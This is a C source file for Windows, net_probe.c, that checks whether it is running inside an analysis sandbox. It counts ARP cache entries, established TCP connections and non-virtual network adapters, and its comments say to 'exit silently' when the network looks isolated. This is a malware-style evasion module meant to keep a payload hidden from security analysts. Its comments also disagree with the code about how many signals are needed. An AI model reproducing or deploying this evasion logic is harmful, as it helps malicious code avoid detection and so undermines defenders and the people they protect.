/*
 * net_probe.c — Local network environment depth check
 *
 * Sandboxes use isolated or tightly controlled network environments.
 * A controlled sandbox network typically has:
 *   - ARP table: 1-2 entries (just the gateway, maybe a DNS server)
 *   - Established TCP connections: 0-2 (nothing is using the machine)
 *   - DNS cache: empty or only sandbox-injected entries
 *
 * A real corporate or home machine typically has:
 *   - ARP table: 10-30+ entries (printers, phones, other PCs, servers)
 *   - Established TCP connections: 5-20+ (browsers, email, telemetry)
 *   - DNS cache: dozens of entries from normal browsing/system activity
 *
 * This check is LOCAL ONLY — no packets are sent, no DNS queries made.
 * All data comes from in-memory tables maintained by Windows.
 *
 * Return values (net_probe_check):
 *   0 = network looks real — proceed
 *   1 = network looks isolated — likely sandbox, exit silently
 */

#if defined(_WIN32)||defined(_WIN64)
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>
#include <iphlpapi.h>
#include <tcpmib.h>
#include <stdint.h>

/* ── 1. ARP table entry count ──────────────────────────────────────────────
 * GetIpNetTable returns the ARP cache: one row per IP↔MAC mapping the
 * system has learned from network traffic. Isolated sandbox networks have
 * almost nothing here.
 *
 * We skip loopback (127.x) and multicast/broadcast entries.
 * Returns raw count of non-loopback dynamic/static ARP entries.
 */
static int count_arp_entries(void) {
    ULONG sz = 0;
    if (GetIpNetTable(NULL, &sz, FALSE) != ERROR_INSUFFICIENT_BUFFER) return 0;
    MIB_IPNETTABLE *tbl = (MIB_IPNETTABLE *)malloc(sz);
    if (!tbl) return 0;

    int count = 0;
    if (GetIpNetTable(tbl, &sz, FALSE) == NO_ERROR) {
        for (DWORD i = 0; i < tbl->dwNumEntries; i++) {
            MIB_IPNETROW *row = &tbl->table[i];
            /* Skip loopback and invalid entries */
            DWORD ip = row->dwAddr;
            unsigned char a = (unsigned char)(ip & 0xFF);
            if (a == 127) continue;                    /* loopback */
            if (a == 255) continue;                    /* broadcast */
            /* Skip multicast (224.x.x.x - 239.x.x.x) */
            if (a >= 224 && a <= 239) continue;
            /* Only count dynamic and static entries (not incomplete/other) */
            if (row->dwType == MIB_IPNET_TYPE_DYNAMIC ||
                row->dwType == MIB_IPNET_TYPE_STATIC) {
                count++;
            }
        }
    }
    free(tbl);
    return count;
}

/* ── 2. Established TCP connection count ───────────────────────────────────
 * GetTcpTable2 returns all TCP connections with their states.
 * MIB_TCP_STATE_ESTAB = 5 (established connection).
 *
 * We skip connections to/from loopback addresses.
 * Real machines running Chrome, Teams, Outlook, telemetry: 10-40+ established.
 * Fresh sandbox: 0-2.
 */
static int count_established_tcp(void) {
    ULONG sz = 0;
    if (GetTcpTable2(NULL, &sz, FALSE) != ERROR_INSUFFICIENT_BUFFER) return 0;
    MIB_TCPTABLE2 *tbl = (MIB_TCPTABLE2 *)malloc(sz);
    if (!tbl) return 0;

    int count = 0;
    if (GetTcpTable2(tbl, &sz, FALSE) == NO_ERROR) {
        for (DWORD i = 0; i < tbl->dwNumEntries; i++) {
            MIB_TCPROW2 *row = &tbl->table[i];
            if (row->dwState != 5 /* MIB_TCP_STATE_ESTAB */) continue;
            /* Skip loopback */
            unsigned char la = (unsigned char)(row->dwLocalAddr & 0xFF);
            unsigned char ra = (unsigned char)(row->dwRemoteAddr & 0xFF);
            if (la == 127 || ra == 127) continue;
            count++;
        }
    }
    free(tbl);
    return count;
}

/* ── 3. Network adapter count (non-virtual) ────────────────────────────────
 * Real machines have physical network adapters (Ethernet, WiFi).
 * Sandboxes often have only one adapter or only virtual adapters.
 *
 * We don't count adapters with loopback or known-virtual descriptions.
 * Returns count of plausibly physical adapters.
 */
static int count_physical_adapters(void) {
    ULONG sz = 0;
    if (GetAdaptersInfo(NULL, &sz) != ERROR_BUFFER_OVERFLOW) return 0;
    PIP_ADAPTER_INFO info = (PIP_ADAPTER_INFO)malloc(sz);
    if (!info) return 0;

    int count = 0;
    if (GetAdaptersInfo(info, &sz) == NO_ERROR) {
        for (PIP_ADAPTER_INFO p = info; p; p = p->Next) {
            /* Skip adapters with no IP or loopback IP */
            if (strncmp(p->IpAddressList.IpAddress.String, "0.0.0.0", 7) == 0) continue;
            if (strncmp(p->IpAddressList.IpAddress.String, "127.", 4) == 0) continue;
            /* Quick virtual adapter heuristic via description */
            char desc[256] = {0};
            strncpy(desc, p->Description, sizeof(desc) - 1);
            /* lowercase in-place */
            for (int i = 0; desc[i]; i++) {
                if (desc[i] >= 'A' && desc[i] <= 'Z') desc[i] += 32;
            }
            int virt = (strstr(desc, "virtual") || strstr(desc, "vmware") ||
                        strstr(desc, "vbox")    || strstr(desc, "loopback") ||
                        strstr(desc, "tunnel")  || strstr(desc, "teredo") ||
                        strstr(desc, "isatap")  || strstr(desc, "miniport")) ? 1 : 0;
            if (!virt) count++;
        }
    }
    free(info);
    return count;
}

/*
 * net_probe_check(min_arp_entries)
 *
 * Combines ARP count, TCP established, and adapter count into a simple
 * "does this look like a real network?" decision.
 *
 * min_arp_entries: minimum ARP table entries to consider real (suggested: 3)
 *
 * Decision logic:
 *   - If ARP < min_arp AND tcp_estab < 3 AND adapters < 1 → suspicious (return 1)
 *   - Any single positive signal (reasonable ARP OR active connections) → allow (return 0)
 *   - Conservative: only flag when MULTIPLE signals point to isolation
 *
 * Returns:
 *   0 = network looks real  — proceed
 *   1 = network looks isolated — exit silently
 */
int net_probe_check(int min_arp_entries) {
    int arp     = count_arp_entries();
    int tcp     = count_established_tcp();
    int phys    = count_physical_adapters();

    /* Need at least two "suspicious" signals to trigger — conservative */
    int suspicious_count = 0;
    if (arp  < min_arp_entries) suspicious_count++;
    if (tcp  < 3)               suspicious_count++;
    if (phys < 1)               suspicious_count++;

    /* Only exit if all three signals suggest isolation */
    return (suspicious_count >= 3) ? 1 : 0;
}

#else  /* Non-Windows stub */

int net_probe_check(int min_arp_entries) {
    (void)min_arp_entries;
    return 0; /* not applicable outside Windows — always pass */
}

#endif
